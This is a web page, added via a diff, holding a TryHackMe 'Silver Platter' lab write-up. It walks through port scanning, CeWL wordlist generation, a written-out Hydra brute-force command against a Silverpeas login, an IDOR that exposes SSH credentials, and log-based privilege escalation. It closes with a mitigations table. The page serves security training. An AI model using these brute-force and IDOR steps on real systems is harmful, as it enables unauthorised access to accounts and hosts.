@@ -1,0 +1,120 @@
+<!doctype html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Silver Platter — TryHackMe writeup | Farhan Hussain</title>
+<meta name="description" content="A contact form named a Silverpeas username. CeWL wordlist plus Hydra cracked the password. Inside Silverpeas, an IDOR on the message ID parameter exposed…">
+<link rel="canonical" href="https://thecyberfarhan.github.io/writeups/silverplatter.html">
+<meta property="og:title" content="Silver Platter — TryHackMe writeup">
+<meta property="og:description" content="A contact form named a Silverpeas username. CeWL wordlist plus Hydra cracked the password. Inside Silverpeas, an IDOR on the message ID parameter exposed…">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://thecyberfarhan.github.io/writeups/silverplatter.html">
+<meta name="twitter:card" content="summary">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='7' fill='%23161b22'/%3E%3Crect x='1' y='1' width='30' height='30' rx='6' fill='none' stroke='%23B4232C' stroke-width='2'/%3E%3Ctext x='16' y='22' font-family='Arial' font-size='18' font-weight='700' text-anchor='middle' fill='%23e6edf3'%3EF%3C/text%3E%3C/svg%3E">
+<link rel="stylesheet" href="writeup.css">
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"TechArticle","headline":"Silver Platter — TryHackMe writeup","description":"A contact form named a Silverpeas username. CeWL wordlist plus Hydra cracked the password. Inside Silverpeas, an IDOR on the message ID parameter exposed…","author":{"@id":"https://thecyberfarhan.github.io/#me"},"datePublished":"2026-06-16","url":"https://thecyberfarhan.github.io/writeups/silverplatter.html","mainEntityOfPage":"https://thecyberfarhan.github.io/writeups/silverplatter.html"}</script>
+</head>
+<body>
+<div class="wrap">
+  <div class="topbar">
+    <a class="back" href="./">&larr; All writeups</a>
+    <a class="brand" href="https://thecyberfarhan.github.io/">Farhan<span>.</span></a>
+  </div>
+  <p class="eyebrow">TryHackMe writeup</p>
+  <h1>Silver Platter</h1>
+  <div class="meta">
+    <span class="plat">TryHackMe</span>
+    <span class="diff">Medium</span>
+    <span>June 16, 2026</span>
+  </div>
+  <div class="tldr"><b>TL;DR</b>A contact form named a Silverpeas username. CeWL wordlist plus Hydra cracked the password. Inside Silverpeas, an IDOR on the message ID parameter exposed SSH credentials for <code>tim</code>. As <code>tim</code> (member of <code>adm</code> group), reading <code>/var/log/auth.log.2</code> revealed <code>tyler</code>'s password in a logged Docker command. Tyler has unrestricted <code>sudo</code> — one <code>sudo su</code> to root. </div>
+  <div class="tools"><span class="chip">🔎 RustScan + Nmap</span><span class="chip">🕷 Feroxbuster</span><span class="chip">📝 CeWL</span><span class="chip">🐉 Hydra</span><span class="chip">🦊 Burp Suite</span><span class="chip">🔑 SSH</span></div>
+  <h2>Introduction</h2>
+<p>Today's target is <strong>Silver Platter</strong> — a box that opens by daring you to use rockyou.txt and then daring you to think of something better. The room explicitly tells you the password policy blocks any password in the rockyou wordlist — a hint to build a targeted wordlist from the site itself. The escalation path is equally deliberate: IDOR on internal message IDs, credentials in a log file, and a user who can <code>sudo</code> everything. The box hands the flag to you on a silver platter — but only after you've earned it through careful enumeration.</p>
+<h3>Prerequisites</h3>
+<p>Readers are assumed to know:</p>
+<ul><li>What CeWL is and why site-scraped wordlists beat generic ones in targeted attacks</li><li>What IDOR is and how incrementing ID parameters reveals unauthorised data</li><li>What the <code>adm</code> group grants in Ubuntu and why log file access matters</li><li>How plaintext credentials end up in auth logs via command history</li></ul>
+<h2>Recon</h2>
+<p class="aside">(~0 mins into the box)</p>
+<h3>Port Scan</h3>
+<p class="aside">Service and version fingerprinting via Nmap:</p>
+<pre><code>rustscan -a 10.49.190.34 -r 1-65535 --ulimit 5000 -- -Pn -sC -sV</code></pre>
+<table><thead><tr><th>Port</th><th>Service</th><th>Version</th></tr></thead><tbody><tr><td>22/tcp</td><td>SSH</td><td>OpenSSH 8.9p1 Ubuntu 3ubuntu0.4</td></tr><tr><td>80/tcp</td><td>HTTP</td><td>nginx 1.18.0 (Ubuntu) — "Hack Smarter Security"</td></tr><tr><td>8080/tcp</td><td>HTTP-proxy</td><td>Unknown — returns 404 on root</td></tr></tbody></table>
+<p>Three ports. Port 80 runs a corporate-looking static site. Port 8080 is unidentified but responds to HTTP — worth enumerating separately.</p>
+<h3>Web Directory Enumeration — Port 80</h3>
+<p class="aside">Feroxbuster on port 80:</p>
+<pre><code>feroxbuster -u http://10.49.190.34/ -w /usr/share/wordlists/dirb/common.txt</code></pre>
+<p>Static site assets only — no actionable PHP or admin paths. The homepage's contact section is more useful than any directory scan:</p>
+<pre><code>If you'd like to get in touch with us, please reach out to our project
+manager on Silverpeas. His username is "scr1ptkiddy".</code></pre>
+<p>Username: <code>scr1ptkiddy</code> on a platform called Silverpeas.</p>
+<h3>Web Directory Enumeration — Port 8080</h3>
+<p class="aside">Feroxbuster on port 8080:</p>
+<pre><code>feroxbuster -u http://10.49.190.34:8080/ -w /usr/share/wordlists/dirb/common.txt</code></pre>
+
+<pre><code>302  http://10.49.190.34:8080/website    → /website/   (403 Forbidden)
+302  http://10.49.190.34:8080/console    → /noredirect.html</code></pre>
+<p>Neither accessible. Manual navigation to <code>/silverpeas/</code> on port 8080 loads a Silverpeas login portal — found by trying the platform name directly.</p>
+<h2>Foothold</h2>
+<p class="aside">(~10 mins into the box)</p>
+<h3>CeWL Wordlist + Hydra Brute Force</h3>
+<p>The room explicitly states passwords are checked against rockyou.txt — any password in that list is rejected by the application. This isn't a bug, it's a design choice, and it's a hint: use a wordlist that isn't rockyou.txt.</p>
+<p><strong>What is CeWL?</strong> A custom wordlist generator that spiders a target website and extracts words from the content — product names, employee names, company jargon, marketing language. These words are often used as passwords precisely because they're meaningful to the organisation and don't appear in generic wordlists.</p>
+<p class="aside">Generating a wordlist from the homepage:</p>
+<pre><code>cewl http://10.49.190.34/ &gt; pass.txt
+# 345 words extracted</code></pre>
+<p class="aside">Capturing the login POST request structure via Burp Suite:</p>
+<pre><code>POST /silverpeas/AuthenticationServlet
+Login=scr1ptkiddy&amp;Password=abc&amp;DomainId=0
+Failure indicator: response redirects back to defaultLogin.jsp</code></pre>
+<p class="aside">Brute forcing with the CeWL wordlist:</p>
+<pre><code>hydra -l scr1ptkiddy -P pass.txt 10.49.190.34 -s 8080 \
+  http-post-form \
+  "/silverpeas/AuthenticationServlet:Login=^USER^&amp;Password=^PASS^&amp;DomainId=0:F=defaultLogin.jsp" -vV</code></pre>
+
+<pre><code>[8080][http-post-form] host: 10.49.190.34   login: scr1ptkiddy   password: adipiscing</code></pre>
+<p>Password: <code>adipiscing</code> — a Latin placeholder word from the site's lorem ipsum content. Exactly the kind of thing that appears in CeWL output and nowhere in rockyou.txt.</p>
+<h3>IDOR on Silverpeas Message ID</h3>
+<p>Logged into Silverpeas as <code>scr1ptkiddy</code>, a notification indicates an unread message. The message URL structure is:</p>
+<pre><code>/silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=5</code></pre>
+<p><strong>What is IDOR here?</strong> The <code>ID</code> parameter directly references a message record with no check that the requesting user owns that message. Incrementing to <code>ID=6</code> via Burp Suite's Repeater tab:</p>
+<pre><code>GET /silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=6</code></pre>
+
+<pre><code>Dude how do you always forget the SSH password? Use a password manager
+and quit using your silly sticky notes.
+Username: tim
+Password: cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol</code></pre>
+<p>SSH credentials for <code>tim</code>, sitting in someone else's inbox.</p>
+<h3>Credentials Found</h3>
+<table><thead><tr><th>Username</th><th>Password</th><th>Where Found</th></tr></thead><tbody><tr><td><code>scr1ptkiddy</code></td><td><code>adipiscing</code></td><td>Hydra + CeWL wordlist</td></tr><tr><td><code>tim</code></td><td><code>cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol</code></td><td>Silverpeas message IDOR (ID=6)</td></tr></tbody></table>
+<h2>Shell / Access</h2>
+<p class="aside">(~20 mins into the box)</p>
+<p class="aside">SSH login as <code>tim</code>:</p>
+<pre><code>ssh tim@10.49.190.34
+# Password: cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol</code></pre>
+
+<pre><code>tim@ip-10-49-190-34:~$ cat user.txt
+THM{c4ca4238a0b923820dcc509a6f75849b}</code></pre>
+<p><code>sudo -l</code> confirmed <code>tim</code> has no sudo rights. Time to look elsewhere.</p>
+<h2>The Full Chain</h2>
+<p>The complete attack chain:</p>
+<ol><li><strong>Homepage contact section</strong> → Silverpeas username <code>scr1ptkiddy</code></li><li><strong>CeWL</strong> scraped homepage → 345-word custom wordlist</li><li><strong>Hydra</strong> brute forced Silverpeas on port 8080 → <code>adipiscing</code></li><li><strong>IDOR</strong> on message <code>ID=6</code> → SSH credentials <code>tim:cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol</code></li><li><strong>SSH as <code>tim</code></strong> → user flag</li><li><strong><code>adm</code> group</strong> → read <code>/var/log/auth.log.2</code> → <code>tyler</code>'s password in a Docker command</li><li><strong><code>su tyler</code></strong> → full <code>sudo</code> → <code>sudo su</code> → root flag</li></ol>
+<h2>Rabbit Holes</h2>
+<h3>Silverpeas Paths on Port 80</h3>
+<p>Before discovering port 8080, the Silverpeas login paths (<code>/silverpeas/</code>, <code>/silverpeas/jsp/login.jsp</code>, <code>/silverpeas/Main</code>) were tried on port 80. All returned 404 or empty responses. The platform was running on port 8080, not 80 — a lesson in checking all open HTTP ports before concluding a service isn't present.</p>
+<h3>rockyou.txt Against Silverpeas</h3>
+<p>The room's stated password policy is a deterrent. Trying rockyou.txt anyway: the application genuinely rejects passwords found in the list — Hydra returns zero hits against the full 14 million entries. CeWL was the correct tool from the start.</p>
+<h2>Mitigations</h2>
+<table><thead><tr><th>Vulnerability</th><th>Severity</th><th>Mitigation</th></tr></thead><tbody><tr><td>Username published on public homepage</td><td class="sev-medium">Medium</td><td>Never expose internal platform usernames in public-facing contact sections</td></tr><tr><td>Weak CeWL-crackable password (<code>adipiscing</code>)</td><td class="sev-high">High</td><td>Site-derived words are as guessable as dictionary words; use randomly generated passwords that bear no relation to the organisation's content</td></tr><tr><td>IDOR on Silverpeas message IDs</td><td class="sev-high">High</td><td>Enforce server-side ownership checks on every message read request; never trust a client-supplied ID without verifying the requesting user owns that resource</td></tr><tr><td>SSH credentials sent via internal message with no encryption</td><td class="sev-high">High</td><td>Internal messaging systems should not be used for credential distribution; use a dedicated secrets manager or encrypted channel</td></tr><tr><td>Plaintext password in Docker <code>-e</code> flag (visible in auth log)</td><td class="sev-critical">Critical</td><td>Use Docker secrets or environment files (<code>--env-file</code>) rather than passing credentials directly on the command line; command-line arguments appear in <code>ps</code>, <code>sudo</code> logs, and shell history</td></tr><tr><td><code>tyler</code> has unrestricted <code>sudo</code></td><td class="sev-high">High</td><td>Grant only the minimum necessary sudo permissions; unrestricted <code>(ALL:ALL) ALL</code> is equivalent to permanent root access</td></tr></tbody></table>
+  <div class="takeaway"><b>Key takeaway</b>Passwords passed as command-line arguments are logged everywhere — <code>sudo</code> audit logs, shell history, <code>ps</code> output, and <code>/proc</code>. Never pass secrets via <code>-e</code>, <code>-p</code>, or similar flags in commands that get logged. Use environment files, secrets managers, or dedicated credential stores. One <code>grep</code> through auth logs shouldn't hand an attacker lateral movement.</div>
+  <h2>If I Did It Again</h2>
+<p>Try <code>/silverpeas/</code> on port 8080 manually before running Feroxbuster on either port — the platform name was given on the homepage and the URL path is predictable. Also enumerate port 8080 with Feroxbuster simultaneously with port 80 rather than sequentially, cutting discovery time in half.</p>
+  <div class="cta-row">
+    <a class="btn primary" href="https://github.com/thecyberfarhan/CTF-Writeups/blob/main/TryHackme/silverplatter_writeup.md" target="_blank" rel="noopener">Full writeup on GitHub &rarr;</a>
+    <a class="btn" href="./">More writeups</a>
+  </div>
+  <footer>Part of <a href="https://thecyberfarhan.github.io/">thecyberfarhan.github.io</a>. Auto-generated from the <a href="https://github.com/thecyberfarhan/CTF-Writeups">CTF-Writeups</a> repo — edits happen there, not here.</footer>
+</div>
+</body>
+</html>
